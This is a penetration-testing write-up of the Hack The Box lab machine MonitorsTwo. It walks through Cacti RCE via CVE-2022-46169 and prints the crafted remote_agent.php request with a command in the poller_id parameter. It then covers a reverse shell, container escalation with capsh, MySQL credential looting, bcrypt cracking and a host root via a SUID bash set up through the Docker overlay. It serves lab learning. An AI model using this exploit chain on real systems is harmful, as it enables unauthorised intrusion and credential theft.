# [HTB] MonitorsTwo - Penetration Testing Report
# Executive Summary
* **Target OS:** Linux
* **Difficulty:** Easy
* **Target IP:** 10.129.228.231
* **Vectors Used:** Cacti RCE (CVE-2022-46169) / Docker Privilege Escalation

# 1. Reconnaissance
Nmap was used for port scan against target
```bash
nmap -sV -sC 10.129.228.231
```
```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-14 01:32 -0400
Nmap scan report for 10.129.228.231
Host is up (1.1s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.76 seconds
```
<br>

Result:
* **22/SSH (OpenSSH 8.2p1)**
* **80/HTTP(nginx 1.18.0)**
<br>

# 2. Web Enumeration
There was no hidden directory or subdomains existed on the [web page](./images/new.png) as a result of fuzzing. For more enumeration, hydra was also used for bruteforcing against web application, but no significant information was found. The web application was running by `Cacti 1.2.22`.

## BurpSuite
For further enumeration, `BurpSuite` was used against target how web application reacts when it is triggered. [Login request](./images/Screenshot_2026-10-14_02_29_28.png) was intercepted.

# 3. Exploitation
## 1. CVE-2022-46169
`Cacti 1.2.22` was discovered that it is vulnerable against `Cacti RCE` (CVE-2022-46169). Several attempts of exploiting the vulnerability, accessing the internal system via RCE was successful. Following process shows PoC of how exploitation worked.
<br>

1. Send the intercepted request to [repeater](./images/Screenshot_2026-10-14_02_40_47.png) and change the [request method](./images/Screenshot_2026-10-14_02_41_06.png)
```
REQUEST

GET /index.php?__csrf_magic=sid%3A4e720e8aae8196d8ee3bbea3dcff20ce810a322a%2C1792046253&action=login&login_username=username&login_password=password HTTP/1.1
Host: 10.129.228.231
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://10.129.228.231
Connection: keep-alive
Referer: http://10.129.228.231/index.php
Cookie: CactiDateTime=Wed Oct 14 2026 02:28:57 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240; Cacti=a....
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
<br>

2. Switch `index.php` with `remote_agent.php`, which contains target parameter for exploitation. It is discovered that using `poller_id` parameter as cmd allowed Remote Code Execution to internal server by setting `local_data_ids[0]=6`.
```
REQUEST

GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`<bash>` HTTP/1.1
X-Forwarded-For: 127.0.0.1
Host: 10.129.228.231
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://10.129.228.231
Connection: keep-alive
Referer: http://10.129.228.231/index.php
Cookie: CactiDateTime=Wed Oct 14 2026 02:28:57 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240; Cacti=a.....
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
<br>

3. Check if the exploit works properly by sending the editted request. Following response indicates that the exploitation is working even if the attacker cannot directly see output.
```
RESPONSE

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 15 Oct 2026 06:58:02 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.4.33
Last-Modified: Thu, 15 Oct 2026 06:58:02 GMT
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: default-src *; img-src 'self'  data: blob:; style-src 'self' 'unsafe-inline' ; script-src 'self'  'unsafe-inline' ; frame-ancestors 'self'; worker-src 'self' ;
P3P: CP="CAO PSA OUR"
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Content-Length: 55

[{"value":"0","rrd_name":"uptime","local_data_id":"6"}]
```
<br>

4. Start python listener on port 8000 and nc listener on any available port for reverse shell. [Process of sending malicious file](./images/Screenshot_2026-10-14_03_31_33.png) to the target internal server was successful, confirmed by GET request from target system.
<br>

5. [Gain access](./images/Screenshot_2026-10-14_03_32_08.png) as user `www-data` permission into server.

## 2. Stablization
Following processes are for stablized shell to not lose connection.

1. Start shell script as bash.
```bash
script /dev/null -c bash
```

2. Move process to background and stablize with following script. [Here](./images/Screenshot_2026-10-14_03_32_51.png) is the result.
```bash
ctrl+z
stty raw -echo; fg
enter twice
```
<br>

With stablized shell, it could prevent accidental connection lose by pressing `ctrl+c` accidently.

# 4. Lateral Movement
Before directory enumeration, for searching file that was set `suid bit` in the entire system, which potentially allows user to escalate privilege as root user, following command was used.
```bash
find / -perm -4000 2>/dev/null
```

## 1. Privilege Escalation Under Docker Environment
As result, [few executables](./images/Screenshot_2026-10-14_03_37_43.png) were found with suid bit. No special files were existed that allows current user to execute among findings except `capsh`. Checking manual of the file showed that it bears possibility to escalate privilege of current user. Research was done for effective use of following executable, and [root user privilege](./images/Screenshot_2026-10-14_03_47_00.png) was acquired.
<br>

Based on internal server enumeration, since the server name was described as random alphanumeric, which indicates the attacker gained access to docker container involved in the server. Root privilege under docker container successfully acquired.

## 2. SQL Server Enumeration
Continuing enumeration, [config.php](./images/Screenshot_2026-10-14_03_33_55.png) was found under `include` directory. [Contents](./images/Screenshot_2026-10-14_03_34_21.png) of the file include credentials for logging into MySQL server.
```bash
mysql -u root -proot -h db
```
<br>

After logging into [MySQL server](./images/Screenshot_2026-10-14_03_48_08.png), as shown in `config.php`, database named [cacti](./images/Screenshot_2026-10-14_03_48_33.png) was found in the server.
<br>

Using `cacti`, contained tables were found by mysql command `show tables;`. Enumerating category of tables, table named [user_auth](./images/Screenshot_2026-10-14_03_48_56.png) was found, which was consiedered to contain critical information about user authentication. [Here](./images/Screenshot_2026-10-14_03_49_18.png) is the contents of `user_auth`.

## 3. Cracking Password Hash
According to the format of discovered hash, it was confirmed that the hash type was `bycrypt`, which could be cracked by `hashcat`. Here is the process of how hash was cracked.

1. Save found hashes in file and run [hashcat](./images/Screenshot_2026-10-14_03_50_33.png). Format `bycrypt` could be cracked by setting `-m` flag as `3200`, which targets bycrypt.
<br>

2. After hashcat finished its process, use `--show` flag to view [cracked credential](./images/Screenshot_2026-10-14_03_50_43.png). Username `marcus`'s password hash was cracked.

## 4. SSH
Using cracked password, [SSH](./images/Screenshot_2026-10-14_03_51_29.png) into internal server was successful.

# 5. Privilege Escalation
Basic enumeration including `sudo -l`, looking for files that contains suid bit via `find`, and allowed permission for user `marcus` didn't provide useful information for gaining access as root user. However, looking back into docker container, since privilege escalation was achieved, finding location of the container was initiated.

1. Use `mount` to discover docker containers in entire server. [Here](./images/Screenshot_2026-10-14_03_51_43.png) is the result of executing `mount` command

2. Amond the result, look for word `upperdir` and `workdir`, which is the location of the [target docker container](./images/Screenshot_2026-10-14_03_52_43.png).

3. Move to the discovered directory address of container and [confirm](./images/Screenshot_2026-10-14_03_55_35.png) the location matches.

It is confirmed when the file was made by root user under docker container, the main server recognized the file's ownership as root user, which is misconfiguration of shared privilege between docker container and main internal server. Using this vulnerability, copying `/bin/bash` under docker container, changing ownership of file, and set uid bit as 0 was performed.

<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/2947195b-cdc7-4dd0-808e-a8a536349dad" />

By executing the binary file, gaining access as root privilege was successful.

<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/b9a28c1b-6678-4786-99a4-f7520cda56ef" />























